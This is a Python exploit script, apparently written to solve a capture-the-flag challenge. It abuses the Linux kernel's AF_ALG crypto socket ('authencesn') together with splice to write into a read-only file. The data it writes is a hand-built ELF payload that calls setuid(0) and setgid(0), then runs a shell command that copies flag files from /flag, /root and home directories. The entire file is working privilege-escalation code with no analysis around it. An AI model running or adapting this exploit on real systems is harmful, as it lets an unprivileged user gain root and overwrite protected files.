#!/usr/bin/env python3
import os
import socket
import struct
import sys

LEVEL = 279


def elf_payload(cmd: str) -> bytes:
    code = bytearray()
    fixups = []

    def emit(b):
        code.extend(b)

    def lea(modrm, label):
        pos = len(code)
        emit(b"\x48\x8d" + bytes([modrm]) + b"\0\0\0\0")
        fixups.append((pos + 3, label, pos + 7))

    emit(b"\x31\xff\x6a\x69\x58\x0f\x05")  # setuid(0)
    emit(b"\x31\xff\x6a\x6a\x58\x0f\x05")  # setgid(0)
    lea(0x3D, "sh")
    lea(0x1D, "dash_c")
    lea(0x0D, "cmd")
    emit(b"\x31\xd2\x52\x51\x53\x57\x48\x89\xe6\x6a\x3b\x58\x0f\x05")
    emit(b"\x31\xff\x6a\x3c\x58\x0f\x05")

    labels = {"sh": len(code)}
    emit(b"/bin/sh\0")
    labels["dash_c"] = len(code)
    emit(b"-c\0")
    labels["cmd"] = len(code)
    emit(cmd.encode() + b"\0")

    for at, label, next_ip in fixups:
        code[at : at + 4] = struct.pack("<i", labels[label] - next_ip)

    off = 0x78
    size = off + len(code)
    eh = bytearray(0x40)
    eh[:16] = b"\x7fELF\x02\x01\x01" + b"\0" * 9
    struct.pack_into("<HHIQQQIHHHHHH", eh, 16, 2, 0x3E, 1, 0x400000 + off, 0x40, 0, 0, 0x40, 0x38, 1, 0, 0, 0)
    ph = bytearray(0x38)
    struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
    return bytes(eh + ph + code)


def write4(fd, offset, chunk):
    a = socket.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    a.setsockopt(LEVEL, 1, bytes.fromhex("0800010000000010" + "0" * 64))
    a.setsockopt(LEVEL, 5, None, 4)
    u, _ = a.accept()
    z = b"\0"
    o = offset + 4
    u.sendmsg([b"A" * 4 + chunk], [(LEVEL, 3, z * 4), (LEVEL, 2, b"\x10" + z * 19), (LEVEL, 4, b"\x08" + z * 3)], 32768)
    r, w = os.pipe()
    os.splice(fd, w, o, offset_src=0)
    os.splice(r, u.fileno(), o)
    try:
        u.recv(8 + offset)
    except Exception:
        pass
    for x in (r, w, u.fileno(), a.fileno()):
        try:
            os.close(x)
        except OSError:
            pass


def copy_fail_fd(fd, data):
    for i in range(0, len(data), 4):
        write4(fd, i, data[i : i + 4].ljust(4, b"\0"))


out = sys.argv[2]
cmd = (
    f"for f in /flag /flag.txt /root/flag /root/flag.txt /home/*/flag*; do "
    f"[ -r \"$f\" ] && {{ cat \"$f\" > {out}; chmod 644 {out}; exit; }}; done; "
    f"id > {out}.err 2>&1"
)
payload = elf_payload(cmd)
fd = os.open(sys.argv[1], os.O_RDONLY)
print(f"patching {sys.argv[1]} payload={len(payload)} out={out}", flush=True)
copy_fail_fd(fd, payload)
os.close(fd)
print("done", flush=True)
